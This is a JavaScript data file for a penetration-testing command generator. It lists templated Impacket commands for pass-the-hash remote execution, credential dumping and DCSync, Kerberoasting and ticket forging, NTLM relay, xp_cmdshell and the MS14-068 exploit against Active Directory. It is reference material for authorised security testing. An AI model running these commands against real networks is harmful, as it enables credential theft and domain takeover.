// ♥ Panko's Impacket Command Generator - Data ♥
// Impacket tool commands organized by category

const impacketCommands = [
    // ========================================================================
    // REMOTE EXECUTION
    // ========================================================================
    {
        name: "psexec.py",
        command: "psexec.py {domain}/{username}:{password}@{target} {command}",
        meta: ["execution", "smb", "password"],
        description: "Execute commands remotely via SMB (PSEXEC-like)",
        params: ["domain", "username", "password", "target", "command"]
    },
    {
        name: "psexec.py (NTLM hash)",
        command: "psexec.py -hashes :{ntlm_hash} {domain}/{username}@{target} {command}",
        meta: ["execution", "smb", "hash"],
        description: "Execute commands using NTLM hash (Pass-the-Hash)",
        params: ["domain", "username", "ntlm_hash", "target", "command"]
    },
    {
        name: "smbexec.py",
        command: "smbexec.py {domain}/{username}:{password}@{target}",
        meta: ["execution", "smb", "password"],
        description: "Execute commands via SMB without uploading binary",
        params: ["domain", "username", "password", "target"]
    },
    {
        name: "smbexec.py (NTLM hash)",
        command: "smbexec.py -hashes :{ntlm_hash} {domain}/{username}@{target}",
        meta: ["execution", "smb", "hash"],
        description: "Execute via SMB using NTLM hash",
        params: ["domain", "username", "ntlm_hash", "target"]
    },
    {
        name: "wmiexec.py",
        command: "wmiexec.py {domain}/{username}:{password}@{target}",
        meta: ["execution", "wmi", "password"],
        description: "Execute commands remotely via WMI",
        params: ["domain", "username", "password", "target"]
    },
    {
        name: "wmiexec.py (NTLM hash)",
        command: "wmiexec.py -hashes :{ntlm_hash} {domain}/{username}@{target}",
        meta: ["execution", "wmi", "hash"],
        description: "Execute via WMI using NTLM hash",
        params: ["domain", "username", "ntlm_hash", "target"]
    },
    {
        name: "dcomexec.py",
        command: "dcomexec.py {domain}/{username}:{password}@{target}",
        meta: ["execution", "dcom", "password"],
        description: "Execute commands via DCOM (multiple methods)",
        params: ["domain", "username", "password", "target"]
    },
    {
        name: "dcomexec.py (NTLM hash)",
        command: "dcomexec.py -hashes :{ntlm_hash} {domain}/{username}@{target}",
        meta: ["execution", "dcom", "hash"],
        description: "Execute via DCOM using NTLM hash",
        params: ["domain", "username", "ntlm_hash", "target"]
    },
    {
        name: "atexec.py",
        command: "atexec.py {domain}/{username}:{password}@{target} '{command}'",
        meta: ["execution", "scheduler", "password"],
        description: "Execute commands via Task Scheduler",
        params: ["domain", "username", "password", "target", "command"]
    },

    // ========================================================================
    // CREDENTIAL DUMPING
    // ========================================================================
    {
        name: "secretsdump.py (local SAM)",
        command: "secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL",
        meta: ["credentials", "sam", "local"],
        description: "Dump credentials from local SAM/SECURITY/SYSTEM hives",
        params: []
    },
    {
        name: "secretsdump.py (remote)",
        command: "secretsdump.py {domain}/{username}:{password}@{target}",
        meta: ["credentials", "ntds", "password"],
        description: "Dump credentials remotely (SAM, LSA secrets, NTDS.dit)",
        params: ["domain", "username", "password", "target"]
    },
    {
        name: "secretsdump.py (NTLM hash)",
        command: "secretsdump.py -hashes :{ntlm_hash} {domain}/{username}@{target}",
        meta: ["credentials", "ntds", "hash"],
        description: "Dump credentials using NTLM hash",
        params: ["domain", "username", "ntlm_hash", "target"]
    },
    {
        name: "secretsdump.py (NTDS.dit only)",
        command: "secretsdump.py -ntds ntds.dit -system SYSTEM -hashes :{ntlm_hash} LOCAL",
        meta: ["credentials", "ntds", "local"],
        description: "Extract hashes from NTDS.dit file",
        params: ["ntlm_hash"]
    },
    {
        name: "secretsdump.py (DC Sync)",
        command: "secretsdump.py -just-dc-ntlm {domain}/{username}:{password}@{target}",
        meta: ["credentials", "dcsync", "password"],
        description: "Perform DCSync attack to get NTLM hashes",
        params: ["domain", "username", "password", "target"]
    },
    {
        name: "secretsdump.py (specific user)",
        command: "secretsdump.py -just-dc-user {target_user} {domain}/{username}:{password}@{target}",
        meta: ["credentials", "dcsync", "password"],
        description: "DCSync for specific user account",
        params: ["target_user", "domain", "username", "password", "target"]
    },

    // ========================================================================
    // KERBEROS ATTACKS
    // ========================================================================
    {
        name: "GetNPUsers.py (ASREPRoast)",
        command: "GetNPUsers.py {domain}/ -usersfile users.txt -format hashcat -outputfile hashes.txt",
        meta: ["kerberos", "asreproast", "no-auth"],
        description: "ASREPRoast attack - get hashes for users without pre-auth",
        params: ["domain"]
    },
    {
        name: "GetNPUsers.py (single user)",
        command: "GetNPUsers.py {domain}/{username} -no-pass",
        meta: ["kerberos", "asreproast", "no-auth"],
        description: "ASREPRoast for specific user",
        params: ["domain", "username"]
    },
    {
        name: "GetUserSPNs.py (Kerberoast)",
        command: "GetUserSPNs.py {domain}/{username}:{password} -dc-ip {dc_ip} -request",
        meta: ["kerberos", "kerberoast", "password"],
        description: "Kerberoast attack - request service tickets",
        params: ["domain", "username", "password", "dc_ip"]
    },
    {
        name: "GetUserSPNs.py (output to file)",
        command: "GetUserSPNs.py {domain}/{username}:{password} -dc-ip {dc_ip} -request -outputfile kerberoast.txt",
        meta: ["kerberos", "kerberoast", "password"],
        description: "Kerberoast with output to file",
        params: ["domain", "username", "password", "dc_ip"]
    },
    {
        name: "getTGT.py",
        command: "getTGT.py {domain}/{username}:{password}",
        meta: ["kerberos", "tgt", "password"],
        description: "Request TGT (Ticket Granting Ticket)",
        params: ["domain", "username", "password"]
    },
    {
        name: "getTGT.py (NTLM hash)",
        command: "getTGT.py -hashes :{ntlm_hash} {domain}/{username}",
        meta: ["kerberos", "tgt", "hash"],
        description: "Request TGT using NTLM hash",
        params: ["domain", "username", "ntlm_hash"]
    },
    {
        name: "getTGT.py (AES key)",
        command: "getTGT.py -aesKey {aes_key} {domain}/{username}",
        meta: ["kerberos", "tgt", "aes"],
        description: "Request TGT using AES key",
        params: ["domain", "username", "aes_key"]
    },
    {
        name: "getST.py",
        command: "getST.py -spn {spn} -impersonate {target_user} {domain}/{username}:{password}",
        meta: ["kerberos", "delegation", "password"],
        description: "Request Service Ticket (S4U2Self/S4U2Proxy)",
        params: ["spn", "target_user", "domain", "username", "password"]
    },
    {
        name: "ticketer.py (Golden Ticket)",
        command: "ticketer.py -nthash {krbtgt_hash} -domain-sid {domain_sid} -domain {domain} {username}",
        meta: ["kerberos", "golden-ticket", "hash"],
        description: "Create Golden Ticket (requires krbtgt hash)",
        params: ["krbtgt_hash", "domain_sid", "domain", "username"]
    },
    {
        name: "ticketer.py (Silver Ticket)",
        command: "ticketer.py -nthash {service_hash} -domain-sid {domain_sid} -domain {domain} -spn {spn} {username}",
        meta: ["kerberos", "silver-ticket", "hash"],
        description: "Create Silver Ticket (requires service hash)",
        params: ["service_hash", "domain_sid", "domain", "spn", "username"]
    },

    // ========================================================================
    // SMB OPERATIONS
    // ========================================================================
    {
        name: "smbclient.py (list shares)",
        command: "smbclient.py {domain}/{username}:{password}@{target}",
        meta: ["smb", "enumeration", "password"],
        description: "Interactive SMB client - browse shares",
        params: ["domain", "username", "password", "target"]
    },
    {
        name: "smbclient.py (NTLM hash)",
        command: "smbclient.py -hashes :{ntlm_hash} {domain}/{username}@{target}",
        meta: ["smb", "enumeration", "hash"],
        description: "SMB client using NTLM hash",
        params: ["domain", "username", "ntlm_hash", "target"]
    },
    {
        name: "smbserver.py",
        command: "smbserver.py {share_name} {local_path} -smb2support",
        meta: ["smb", "server", "transfer"],
        description: "Start SMB server for file transfers",
        params: ["share_name", "local_path"]
    },
    {
        name: "smbserver.py (authenticated)",
        command: "smbserver.py {share_name} {local_path} -smb2support -username {username} -password {password}",
        meta: ["smb", "server", "transfer"],
        description: "Start authenticated SMB server",
        params: ["share_name", "local_path", "username", "password"]
    },
    {
        name: "lookupsid.py",
        command: "lookupsid.py {domain}/{username}:{password}@{target}",
        meta: ["smb", "enumeration", "password"],
        description: "Enumerate domain users via SID bruteforce",
        params: ["domain", "username", "password", "target"]
    },
    {
        name: "reg.py (query)",
        command: "reg.py {domain}/{username}:{password}@{target} query -keyName {key_path}",
        meta: ["smb", "registry", "password"],
        description: "Query remote registry",
        params: ["domain", "username", "password", "target", "key_path"]
    },
    {
        name: "services.py (list)",
        command: "services.py {domain}/{username}:{password}@{target} list",
        meta: ["smb", "services", "password"],
        description: "List remote services",
        params: ["domain", "username", "password", "target"]
    },

    // ========================================================================
    // LDAP / ACTIVE DIRECTORY
    // ========================================================================
    {
        name: "GetADUsers.py",
        command: "GetADUsers.py {domain}/{username}:{password} -all -dc-ip {dc_ip}",
        meta: ["ldap", "enumeration", "password"],
        description: "Enumerate all Active Directory users",
        params: ["domain", "username", "password", "dc_ip"]
    },
    {
        name: "GetADUsers.py (NTLM hash)",
        command: "GetADUsers.py -hashes :{ntlm_hash} {domain}/{username} -all -dc-ip {dc_ip}",
        meta: ["ldap", "enumeration", "hash"],
        description: "Enumerate AD users using NTLM hash",
        params: ["domain", "username", "ntlm_hash", "dc_ip"]
    },
    {
        name: "addcomputer.py",
        command: "addcomputer.py {domain}/{username}:{password} -computer-name {computer_name} -computer-pass {computer_pass} -dc-ip {dc_ip}",
        meta: ["ldap", "computer", "password"],
        description: "Add computer account to domain",
        params: ["domain", "username", "password", "computer_name", "computer_pass", "dc_ip"]
    },
    {
        name: "rbcd.py (read)",
        command: "rbcd.py {domain}/{username}:{password} -delegate-to {target_computer} -dc-ip {dc_ip} -action read",
        meta: ["ldap", "delegation", "password"],
        description: "Read Resource-Based Constrained Delegation",
        params: ["domain", "username", "password", "target_computer", "dc_ip"]
    },
    {
        name: "rbcd.py (write)",
        command: "rbcd.py {domain}/{username}:{password} -delegate-from {attacker_computer} -delegate-to {target_computer} -dc-ip {dc_ip} -action write",
        meta: ["ldap", "delegation", "password"],
        description: "Configure RBCD for privilege escalation",
        params: ["domain", "username", "password", "attacker_computer", "target_computer", "dc_ip"]
    },

    // ========================================================================
    // RELAY ATTACKS
    // ========================================================================
    {
        name: "ntlmrelayx.py (SMB relay)",
        command: "ntlmrelayx.py -tf targets.txt -smb2support",
        meta: ["relay", "smb", "mitm"],
        description: "NTLM relay to SMB targets",
        params: []
    },
    {
        name: "ntlmrelayx.py (dump SAM)",
        command: "ntlmrelayx.py -tf targets.txt -smb2support --sam",
        meta: ["relay", "smb", "credentials"],
        description: "Relay and dump SAM database",
        params: []
    },
    {
        name: "ntlmrelayx.py (execute command)",
        command: "ntlmrelayx.py -tf targets.txt -smb2support -c '{command}'",
        meta: ["relay", "smb", "execution"],
        description: "Relay and execute command",
        params: ["command"]
    },
    {
        name: "ntlmrelayx.py (LDAP)",
        command: "ntlmrelayx.py -t ldap://{dc_ip} --escalate-user {username}",
        meta: ["relay", "ldap", "escalation"],
        description: "Relay to LDAP and escalate privileges",
        params: ["dc_ip", "username"]
    },
    {
        name: "ntlmrelayx.py (SOCKS)",
        command: "ntlmrelayx.py -tf targets.txt -smb2support -socks",
        meta: ["relay", "socks", "proxy"],
        description: "Setup SOCKS proxy for relayed connections",
        params: []
    },

    // ========================================================================
    // MSSQL ATTACKS
    // ========================================================================
    {
        name: "mssqlclient.py",
        command: "mssqlclient.py {domain}/{username}:{password}@{target} -windows-auth",
        meta: ["mssql", "database", "password"],
        description: "Interactive MSSQL client",
        params: ["domain", "username", "password", "target"]
    },
    {
        name: "mssqlclient.py (enable xp_cmdshell)",
        command: "mssqlclient.py {domain}/{username}:{password}@{target} -windows-auth",
        meta: ["mssql", "execution", "password"],
        description: "Connect to MSSQL (use 'enable_xp_cmdshell' then 'xp_cmdshell whoami')",
        params: ["domain", "username", "password", "target"]
    },

    // ========================================================================
    // MISCELLANEOUS
    // ========================================================================
    {
        name: "GetUserSPNs.py (find delegation)",
        command: "GetUserSPNs.py {domain}/{username}:{password} -dc-ip {dc_ip} -target-domain {domain}",
        meta: ["enumeration", "delegation", "password"],
        description: "Find accounts with delegation enabled",
        params: ["domain", "username", "password", "dc_ip"]
    },
    {
        name: "findDelegation.py",
        command: "findDelegation.py {domain}/{username}:{password} -dc-ip {dc_ip}",
        meta: ["enumeration", "delegation", "password"],
        description: "Find delegation accounts in domain",
        params: ["domain", "username", "password", "dc_ip"]
    },
    {
        name: "goldenPac.py",
        command: "goldenPac.py {domain}/{username}:{password}@{target}",
        meta: ["kerberos", "ms14-068", "password"],
        description: "MS14-068 exploit (Kerberos PAC validation)",
        params: ["domain", "username", "password", "target"]
    },
    {
        name: "raiseChild.py",
        command: "raiseChild.py {child_domain}/{username}:{password}",
        meta: ["escalation", "trust", "password"],
        description: "Escalate from child to parent domain",
        params: ["child_domain", "username", "password"]
    },
    {
        name: "rpcdump.py",
        command: "rpcdump.py {domain}/{username}:{password}@{target}",
        meta: ["enumeration", "rpc", "password"],
        description: "Dump RPC endpoints",
        params: ["domain", "username", "password", "target"]
    },
    {
        name: "samrdump.py",
        command: "samrdump.py {domain}/{username}:{password}@{target}",
        meta: ["enumeration", "sam", "password"],
        description: "Dump user information via SAMR",
        params: ["domain", "username", "password", "target"]
    },
    {
        name: "netview.py",
        command: "netview.py {domain}/{username}:{password} -target {target}",
        meta: ["enumeration", "network", "password"],
        description: "Enumerate logged-on users and shares",
        params: ["domain", "username", "password", "target"]
    },
    {
        name: "exchanger.py",
        command: "exchanger.py {domain}/{username}:{password}@{exchange_server}",
        meta: ["exchange", "email", "password"],
        description: "Exchange server interaction",
        params: ["domain", "username", "password", "exchange_server"]
    },
    {
        name: "addcomputer.py (MAQ exploit)",
        command: "addcomputer.py {domain}/{username}:{password} -computer-name {computer_name}$ -computer-pass {computer_pass} -dc-ip {dc_ip}",
        meta: ["ldap", "maq", "password"],
        description: "Exploit MachineAccountQuota to add computer",
        params: ["domain", "username", "password", "computer_name", "computer_pass", "dc_ip"]
    }
];

// Category definitions
const categories = {
    "all": "All Commands",
    "execution": "Remote Execution",
    "credentials": "Credential Dumping",
    "kerberos": "Kerberos Attacks",
    "smb": "SMB Operations",
    "ldap": "LDAP / Active Directory",
    "relay": "Relay Attacks",
    "enumeration": "Enumeration",
    "escalation": "Privilege Escalation"
};
